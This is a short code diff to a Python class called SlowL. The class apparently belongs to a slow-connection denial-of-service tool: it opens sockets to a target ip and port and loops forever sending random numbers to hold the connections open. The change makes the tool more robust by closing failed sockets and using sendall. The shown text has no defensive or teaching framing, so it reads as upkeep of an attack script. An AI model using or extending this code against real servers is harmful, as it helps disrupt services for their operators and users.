@@ -22,11 +22,12 @@ class SlowL:
 		try:
 			sock.connect((self.ip, self.port))
 		except:
+			sock.close()
 			self.open -= 1
 			return
 		while True:
 			try:
-				sock.send(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
+				sock.sendall(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
 				sock.recv(1024)
 			except:
 				sock.close()
